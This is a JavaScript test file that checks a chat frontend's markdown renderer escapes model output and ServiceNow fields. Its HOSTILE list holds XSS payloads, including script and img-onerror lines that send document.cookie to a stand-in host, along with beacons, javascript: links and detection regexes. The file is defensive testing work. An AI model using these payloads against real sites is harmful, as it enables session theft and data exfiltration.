// The frontend render invariant, pinned (ADR 0008 D8).
//
// The sid cookie is key material in the Phase-1 design, so an XSS in the
// transcript is not a defacement — it is token theft. And a single <img src>
// that the model or a ServiceNow field can control is a beacon that exfiltrates
// record content to a third party through nothing more than a page load.
// So: model output and instance content are escaped first and rendered as a
// closed set of tags. No <a>, no <img>, no remote loads, no event handlers, no
// javascript: or data: URLs — from any input, however it is spelled.
//
// app.js is a browser script, not a module: it is loaded here in a vm with a
// minimal DOM stub. `document.body.hasAttribute('data-preview')` returns true
// so init() never runs.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { fileURLToPath } from 'node:url';

const APP_JS = path.join(
  path.dirname(fileURLToPath(import.meta.url)), '..', 'public', 'app.js',
);

function loadFrontend() {
  const stubEl = {
    hasAttribute: () => true,
    addEventListener() {},
    querySelector: () => null,
    querySelectorAll: () => [],
    appendChild() {},
    insertBefore() {},
    style: {},
    classList: { add() {}, remove() {}, toggle() {} },
  };
  const sandbox = {
    document: {
      body: stubEl,
      getElementById: () => stubEl,
      querySelector: () => stubEl,
      querySelectorAll: () => [],
      createElement: () => ({ ...stubEl }),
      addEventListener() {},
    },
    location: { assign() {} },
    fetch: () => Promise.reject(new Error('no network in tests')),
    setInterval: () => 0,
    clearInterval() {},
    console,
  };
  vm.createContext(sandbox);
  vm.runInContext(fs.readFileSync(APP_JS, 'utf8'), sandbox, { filename: 'app.js' });
  return sandbox;
}

const { renderMarkdown, escapeHtml } = loadFrontend();

// Everything below is content the model writes or that arrives from a
// ServiceNow field — a short description, a work note, a close note.
const HOSTILE = [
  '<script>fetch("https://evil.test/"+document.cookie)</script>',
  '<img src=x onerror="fetch(`https://evil.test/${document.cookie}`)">',
  '![beacon](https://evil.test/pixel.png)',
  '[click me](https://evil.test/phish)',
  '[click me](javascript:alert(1))',
  '<a href="https://evil.test">link</a>',
  '<iframe src="https://evil.test"></iframe>',
  '<svg/onload=alert(1)>',
  '<link rel="stylesheet" href="https://evil.test/x.css">',
  '<style>@import url(https://evil.test/x.css)</style>',
  '<video src=x onerror=alert(1)>',
  '<object data="https://evil.test/x"></object>',
  '<body onload=alert(1)>',
  "<img src='data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='>",
  '<IMG SRC=x ONERROR=alert(1)>',
  '`<img src=x onerror=alert(1)>`',
  '**<a href="https://evil.test">bold link</a>**',
  '- <img src=x onerror=alert(1)>',
  '# <script>alert(1)</script>',
  '```\n<img src=x onerror=alert(1)>\n```',
  '```html"><script>alert(1)</script>\nx\n```',
  '| <b>a</b> | b |\n|---|---|\n| <img src=x onerror=alert(1)> | [x](javascript:alert(1)) |',
  '> <script>alert(1)</script>',
  '1. <img src=x onerror=alert(1)>',
  'INC0012345 — <b>bold</b> & "quoted" \'text\'',
];

// The COMPLETE set of markup renderMarkdown may emit, matched exactly. An
// allow-list of literal tags — not a denylist of bad ones — is what makes this
// test hold against spellings nobody thought of.
const ALLOWED_MARKUP = [
  /^<\/?(?:p|ul|ol|li|h3|h4|h5|h6|code|strong|em|del|blockquote|table|thead|tbody|tr|th|td)>$/,
  /^<br>$/,
  /^<hr>$/,
  /^<pre class="code">$/,
  /^<\/pre>$/,
  // A fenced block: a head with the language as TEXT (never a class), a copy
  // button with no handler, and the pre. The tokens are literal.
  /^<div class="codeblock">$/,
  /^<div class="codeblock-head">$/,
  /^<span class="codeblock-lang">$/,
  /^<\/span>$/,
  /^<button class="codeblock-copy" type="button">$/,
  /^<\/button>$/,
  /^<\/div>$/,
];

/** Every `<…>` token in the output, in order. */
function markupTokens(html) {
  return html.match(/<[^>]*>/g) || [];
}

/** Everything that is NOT markup — what the browser will show as text. */
function textOutsideMarkup(html) {
  return html.replace(/<[^>]*>/g, '');
}

test('renderMarkdown emits only the allow-listed markup, nothing else', () => {
  for (const input of HOSTILE) {
    for (const token of markupTokens(renderMarkdown(input))) {
      assert.ok(
        ALLOWED_MARKUP.some((re) => re.test(token)),
        `renderMarkdown emitted ${token} for input: ${input}`,
      );
    }
  }
});

test('no emitted markup carries a URL, a source, or an event handler', () => {
  for (const input of HOSTILE) {
    for (const token of markupTokens(renderMarkdown(input))) {
      assert.doesNotMatch(token, /\bsrc\s*=/i, `src attribute in ${token} for: ${input}`);
      assert.doesNotMatch(token, /\bhref\s*=/i, `href attribute in ${token} for: ${input}`);
      assert.doesNotMatch(token, /\bon[a-z]+\s*=/i, `event handler in ${token} for: ${input}`);
      assert.doesNotMatch(token, /javascript:|data:/i, `URL scheme in ${token} for: ${input}`);
      assert.doesNotMatch(
        token,
        /^<\/?\s*(a|img|iframe|script|style|link|object|embed|video|audio|source|svg|base|form)\b/i,
        `loadable element ${token} for: ${input}`,
      );
    }
  }
});

test('hostile input reaches the page as text, never as markup', () => {
  // Escaping runs before markdown, so a "<" from the model can only ever come
  // out as &lt; — if a raw one appears in the text nodes, the escape leaked.
  for (const input of HOSTILE) {
    const text = textOutsideMarkup(renderMarkdown(input));
    assert.ok(!text.includes('<'), `unescaped "<" survived for: ${input}`);
    assert.ok(!text.includes('>'), `unescaped ">" survived for: ${input}`);
  }
});

test('escapeHtml neutralizes every HTML-significant character', () => {
  assert.equal(
    escapeHtml(`<>&"'`),
    '&lt;&gt;&amp;&quot;&#39;',
  );
  // Escaping runs before markdown, so an entity is never re-interpreted.
  assert.equal(renderMarkdown('&lt;script&gt;').includes('<script'), false);
});

test('ordinary markdown still renders', () => {
  assert.match(renderMarkdown('**bold**'), /<strong>bold<\/strong>/);
  assert.match(renderMarkdown('`incident`'), /<code>incident<\/code>/);
  assert.match(renderMarkdown('- one\n- two'), /<ul><li>one<\/li><li>two<\/li><\/ul>/);
  assert.match(renderMarkdown('# Heading'), /<h3>Heading<\/h3>/);
  assert.match(renderMarkdown('```\ncode\n```'), /<pre class="code">/);
  assert.match(renderMarkdown('```javascript\nvar x;\n```'), /<span class="codeblock-lang">javascript<\/span>/);
  assert.match(renderMarkdown('1. one\n2. two'), /<ol><li>one<\/li><li>two<\/li><\/ol>/);
  assert.match(renderMarkdown('> quoted'), /<blockquote><p>quoted<\/p><\/blockquote>/);
  assert.match(
    renderMarkdown('| Number | State |\n|---|---|\n| INC001 | Open |'),
    /<table><thead><tr><th>Number<\/th><th>State<\/th><\/tr><\/thead><tbody><tr><td>INC001<\/td><td>Open<\/td><\/tr><\/tbody><\/table>/,
  );
  // A link renders as its text plus the URL as machine text, never an anchor.
  assert.equal(renderMarkdown('[docs](https://example.test/x)'), '<p>docs <code>https://example.test/x</code></p>');
});
